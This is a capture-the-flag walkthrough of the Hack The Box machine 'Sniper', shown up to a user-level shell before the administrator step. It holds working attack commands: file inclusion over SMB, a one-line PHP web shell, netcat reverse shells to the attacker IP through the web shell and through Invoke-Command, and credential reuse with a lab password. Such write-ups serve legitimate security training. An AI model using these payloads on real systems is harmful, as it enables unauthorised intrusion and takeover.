https://app.hackthebox.com/machines/211

## Sniper - Explore and Nmapping
<br>


New machine, no hints or something suspicious from a first look.
So we'll beging with nmap
```bat
sudo nmap -p- --min-rate 10000 -oA nmap 10.10.10.151
```

![NMAP RESULTS](https://is-going-to-rick-roll.me/1639739248.png)

from the nmap results we can see we have
<br>
* 80 - TCP HTTP
* 135 - TCP MSRPC
* 139 - TCP netbios-ssn
* 445 - TCP microsoft-ds

First of all we already know It's running on windows.
and we have a web panel running on port 80, let's namp these specific ports.


```bat
sudo nmap -p 80,135,139,445 -sV -sC -oA nmap-specific 10.10.10.151
```


meanwhile the nmap is running we can try and login with SMB without a username/and password.

```bat
net view 10.10.10.151

System error 5 has occurred.

Access is denied.
```
Denied.

<br>

The nmap result.
![NMAP RESULT #2](https://is-going-to-rick-roll.me/1639739651.png)

<br>

alright, it semees we'll have to investigate the website, before we'll start gobuster to find all the pages.
checking what is the engine of the website.
http://10.10.10.151/index.php - works

gobuster script (using SecList Discovery/Web-Content/raft-small-words-lowercase)

```bat
sudo gobuster dir -w ../../Helpers/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php -o Sniper.txt -u http://10.10.10.151
```

In the website we have one page with two buttons and text, nothing too much

![website screenshot](https://is-going-to-rick-roll.me/1639741029.png)
<br>

Gobuster result show us we have much more pages than what we can see ->

```txt
/images               (Status: 301) [Size: 150] [--> http://10.10.10.151/images/]
/js                   (Status: 301) [Size: 146] [--> http://10.10.10.151/js/]
/index.php            (Status: 200) [Size: 2635]
/css                  (Status: 301) [Size: 147] [--> http://10.10.10.151/css/]
/user                 (Status: 301) [Size: 148] [--> http://10.10.10.151/user/]
/blog                 (Status: 301) [Size: 148] [--> http://10.10.10.151/blog/]
/.                    (Status: 200) [Size: 2635]
```
From here it looks like we found nothing except these pages, so we'll have to check them maually (or with tools if you have something good you trust)

After looking at each of the pages, the blog page is the one that has the most functions and maybe even vulnerabilities in the select language button. Lets send it over to Burp Suite.

![Burp Suite request](https://is-going-to-rick-roll.me/1639742702.png)
<br>
this is how the request looks like. and since this is requesting pages by the user selecting i think that this is how he implement this function

```php
include $_GET['lang'];
```
changing "?lang=" to test and it's redirecting us to a 404.

let's try fetching a system file with setting "?lang="'s value to "/windows/system.ini"

![found!](https://is-going-to-rick-roll.me/1639742931.png)
<br>
and... it worked. now let's see if we can RFI over SMB.

starting np

```bat
nc -lnvp 445
```

changing the get header in burp to ->
```txt
GET /blog/?lang=\\10.10.14.11\test HTTP/1.1
```

and we've got a request from the server.

![nvlvp result](https://is-going-to-rick-roll.me/1639746488.png)

###### Setting our new work directory
<br>


to continiue we'll have to modify smb.conf
```bat
sudo nano /etc/samba/smb.conf
```

add the following lines:
```conf
[htb]
path = /home/kali/htb/machines/sniper/www/
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
```

After modifyind the conf file you'll have to restart smb's services ->

```bat
service smbd restart

service nmbd restart
```

create new work dir
```bat
mkdir ~/htb/machines/sniper/www

cd ~/htb/machines/sniper/www

chmod 0555 ./  
```

check if our smb server is up and running, we can check it using the following command
```bat
smbmap -H 10.10.14.11
```

![smb server status](https://is-going-to-rick-roll.me/1639760640.png)


#### Setting up the RCE script
<br>

After we maked sure all the services are up and running we can make a new file in out new work directory named notrace.php

```bat
sudo nano notrace.php
```

and we'll write the next code into it.

```php
<?php system($_REQUEST['rce']); ?>
```

Now let's try it out and the parameter for lang that we are sending now will be <mark>\\10.10.14.5\htb\notrace.php&rce=whoami
</mark> (change the IP aadress with your own one)

form the result we can see that the RCE has worked and we executed code on the machine.
![burp result](https://is-going-to-rick-roll.me/1639760979.png)

Now before we'll continue we'll check what can we run by changing the parameter from "whoami" to "Powershell+$executionContext.SessionState.LanguageMode"

looking at the output we get "ConstrainedLanguage" this "tells" us that everything that interacts with .NET might will be blocked.

Now let's move the nc.exe file from the shares folder to our work directory that we setup earlier

```bat
sudo cp ~/../../usr/share/windows-resources/binaries/nc.exe .
```

and another tool (that we'll use later on)

```bat
sudo cp ../../../../../../usr/share/windows-resources/binaries/plink.exe .
```

Now, we can call this file to get it executed by the machine and get a shell. to do so we'll change the parameter again to nc.exe and send this connection back to us.


(make sure to encode this url and change the attaker IP in burp suite otherwise it will not execute)
```s
rce=\\10.10.14.11\htb\nc.exe 10.10.14.11 9001 -e powershell
```

GET payload ->

```s
GET /blog/?lang=\\10.10.14.11\htb\notrace.php&rce=\\10.10.14.11\htb\nc.exe 10.10.14.11 9001 -e powershell 


(After encode)

GET /blog/?lang=\\10.10.14.11\htb\notrace.php&rce=%5c%5c%31%30%2e%31%30%2e%31%34%2e%31%31%5c%68%74%62%5c%6e%63%2e%65%78%65%20%31%30%2e%31%30%2e%31%34%2e%31%31%20%39%30%30%31%20%2d%65%20%70%6f%77%65%72%73%68%65%6c%6c
```

and run netcat listner on the same port
```bat
sudo nc -lnvp 9001
```


![we've got connected!](https://is-going-to-rick-roll.me/1639761882.png)

congrats we have reverse shell!


##### Exploring the machine
<br>

Checking for what users we have

```bat
net user
```
![net user result](https://is-going-to-rick-roll.me/1639763907.png)

```bat
net user Chris
```

![net user chris result](https://is-going-to-rick-roll.me/1639763972.png)

Earlyer we asw in the "db.php" file a password that we might can use for something, and with the result we can see the last modify date of the password and It's the same date as the db.php file last changed. we'll use crackmapexec to broute-force the machine and log-in.

Let's run crackmapexec -> 

```bat
crackmapexec smb 10.10.10.151 -u chris -p '36mEAhz/B8xQ~2VM'
```

![crackmapexec result!](https://is-going-to-rick-roll.me/1639764424.png)

#### Privilege Escalation | Chris
<br>

Now we can confirm the sniper/chris is a valid user with the same password we found, we can use these credentials to remote and get a shell back as Chris.


Now we knwo the other users on the machine and we can try running on chris.

```bat
$user = "Sniper\Chris"

$password = "36mEAhz/B8xQ~2VM"

$secretstr = New-Object -TypeName System.Security.SecureString

$password.ToCharArray() | ForEach-Object {$secretstr.AppendChar($_)}


$credentials = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secretstr

Invoke-Command -ScriptBlock { whoami } -Credential $credentials -Computer localhost

```

Now when have have privilege escalation and we are able to run as other users, we'll get our first flag "user.txt"

```bat
Invoke-Command -ScriptBlock { type \users\chris\desktop\user.txt } -Credential $credentials -Computer localhost
```
![user flag](https://is-going-to-rick-roll.me/1639842780.png)



#### Privilege Escalation |  Administrator
<br>

Let's create a pipe to chris to make it easier on us


run on your machine (on our work dir) ->
```bat
sudo nc -lnvp 443
```

Run on sniper (change the attacker IP) ->
```bat
Invoke-Command -ScriptBlock { \\10.10.14.11\htb\nc.exe -e cmd 10.10.14.11 443 } -Credential $credentials -Computer localhost
```

![we're running as chris](https://is-going-to-rick-roll.me/1639843273.png)

Our bsic plan from a first view we might want to preform another privilege escalation
from Chris -> Administrator.


Since we are on a new user now with more permissions let's review the folders and files check for hints and maybe passwords.






<br><br><br><br>

###### All files and results cna be found in the "results" folder